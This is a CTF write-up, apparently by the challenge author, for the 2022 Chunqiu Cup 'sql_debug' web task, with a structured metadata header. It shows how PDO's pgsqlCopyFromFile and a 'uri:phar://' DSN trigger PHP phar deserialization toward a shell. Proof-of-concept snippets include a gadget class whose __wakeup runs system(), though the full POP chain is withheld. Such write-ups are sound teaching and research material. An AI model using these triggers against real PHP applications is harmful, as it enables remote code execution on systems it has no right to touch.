---
title: 春秋杯 2022/sql_debug
contest: 春秋杯
year: 2022
difficulty: medium
vuln_type:
- deserialize
- phar
- rce
tags:
- Nette
- PHP
- PDO
- pgsqlCopyFromFile
- phar
- dsn_from_uri
attack_chain:
- Nette 框架 install.php 可改数据库配置
- 数据库用 PDO 连接，找 PDO 内部 phar 触发点
- 发现 pdo pgsqlCopyFromFile 函数可触发 phar
- 搜 PHP 源码找 phar 反序列化入口函数 dsn_from_uri
- 构造 PDO dsn="uri:phar://phar.phar/..." 触发 phar 反序列化
- 挖 Nette POP 链子写入 install.lock
- 打 Phar 拿 shell
key_payload: '''new PDO("uri:phar://phar.phar/mysql:host=localhost;dbname=test", $user, $pass)'''
one_liner: PDO dsn_from_uri 触发 phar 反序列化拿 shell
lesson: PHP PDO 的 pgsqlCopyFromFile、dsn_from_uri 等内部函数可作为 phar 反序列化触发点
quality: medium
full_path: 2022春秋杯联赛_传说殿堂赛道_sql_debug题目解析.full.md
meta_path: 2022春秋杯联赛_传说殿堂赛道_sql_debug题目解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋杯 2022/sql_debug。PDO dsn_from_uri 触发 phar 反序列化拿 shell。关键路径：Nette 框架 install.php 可改数据库配置 → 数据库用 PDO 连接，找 PDO 内部 phar 触发点 → 发现 pdo pgsqlCopyFromFile 函数可触发 phar。经验：PHP PDO 的 pgsqlCopyFromFile、dsn_fr...
category: web
subcategory: deserialization
subcategories:
- deserialization
- rce
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/39732.html
reasoning_chain:
- Nette 框架 install.php 可改数据库配置 → 触发点：数据库配置可控
- 假设：高版本 PHP 用恶意 MySQL 读文件已失效 → 动作：分析 Nette database Connection.php
- 观察：使用 PDO 连接 pgsql → 假设：找 PDO 内部 phar 触发点
- 动作：grep PHP 源码找 phar 触发函数 → 观察：pgsqlCopyFromFile / dsn_from_uri
- 假设：构造 PDO dsn='uri:phar://phar.phar/mysql:host=localhost;...' → 动作：挖 Nette POP 链写入 install.lock
- 观察：phar 反序列化触发 __destruct 链 → 假设：可写 install.lock 后打 Phar 拿 shell
- 动作：构造 phar 文件 + POP 链 → 上传 → 访问触发 → 观察：拿 shell
failed_attempts:
- 试图用恶意 MySQL 服务器读文件 → 失败：PHP 高版本禁用 LOAD DATA LOCAL
- 试图用 file:// 协议触发 phar → 失败：PDO 不支持 file 协议
- 试图用 mysql 协议触发 phar → 失败：协议不被 PDO 支持
key_observations:
- PHP PDO 内部函数 pgsqlCopyFromFile / dsn_from_uri 可触发 phar 反序列化
- PHP 源码审计是挖 phar 触发点的有效方法
- Nette 框架 POP 链 + install.lock 写入是 phar 利用链
- 框架源码 + PHP 内部函数 + phar = CTF 高级反序列化套路
prerequisites:
- PHP phar 反序列化原理
- Nette 框架源码审计
- PHP 源码调试 (vscode + lldb)
- POP 链构造基础
---
# 2022春秋杯联赛 传说殿堂赛道 sql_debug题目解析

> 原文: https://www.ctfiot.com/39732.html
> ID: 39732

，

点击蓝字 ·  关注我们

01

前言

02

sql_debug sql_debug 题⽬介绍

在这次2022年春秋杯联赛中，我出了⼀道 sql_debug 赛题。本题环境是 Nette Web ，⼀个PHP框架应⽤。我在环境⾥放了⼀个 install.php 可以修改框架的配置⽂件。

在控制器中呢也可以看到存在⼀个SQL注⼊的⽅法

我在环境⾥没有放置mysql 所以sql注⼊这个地⽅是⾏不通的。在⾼版本php⾥即使是在数据库配置可控的情况下尝试使⽤恶意mysql服务器读取⽂件也是不可以的。选⼿们到这⾥就应该思考 在配置⽂件可控的情况下有什么办法接管服务器了。结合题意我们可以对 Nette 的数据库初始化代码进⾏分析，你可以发现数据库是使⽤pdo进⾏连接的。

source/vendor/nette/database/src/Database/Connection.php

<?php$pdo = new PDO(sprintf("pgsql:
host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');

<?php
class A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');

那么有没有⼀种可能，还有其他的 phar 利⽤⽅式呢？

03

dsn_from_uri 触发phar反序列化

我们跟进php源码 搜索 phar 反序列化的⼊⼝函数。

跟进该函数 可以发现直接调⽤了实参 uri

<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:
phar://phar.phar/$dbms:
host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "
");}$db = new PDO($dsn, $user, $pass, array(PDO::
ATTR_PERSISTENT => true));?>

到这⾥这道题的解法就⾮常明朗了，接下来只需要挖⼀条 Nette 的链⼦写⼊ install.lock 打Phar就好。链⼦较为简单 不是本文的重点 这里就不贴POC了。

04

Linux下PHP内核调试⼩知识

vscode的调试配置⽂件⾥ 可以把参数配置为 -S 这样就可以启动web服务，⾮常的⽅便调试。

{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:
10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }

05

个⼈总结

鸡肋 只适合CTF

互联⽹没看到有⼈发 算是⼀个新的知识点

重点来了

你是否想要加入一个安全团

拥有更好的学习氛围？

那就加入EDI安全，这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事，我们在为打造安全圈好的技术氛围而努力，这里绝对是你学习技术的好地方。这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心，下一个CTF大牛就是你。

欢迎各位大佬小白入驻，大家一起打CTF，一起进步。

我们在挖掘，不让你埋没！

你的加入可以给我们带来新的活力，我们同样也可以赠你无限的发展空间。

有意向的师傅请联系邮箱root@edisec.net（带上自己的简历，简历内容包括自己的学习方向，学习经历等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
source/vendor/nette/database/src/Database/Connection.php
<?php$pdo = new PDO(sprintf("pgsql:
host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
<?php
class A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:
phar://phar.phar/$dbms:
host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "
");}$db = new PDO($dsn, $user, $pass, array(PDO::
ATTR_PERSISTENT => true));?>
{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:
10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]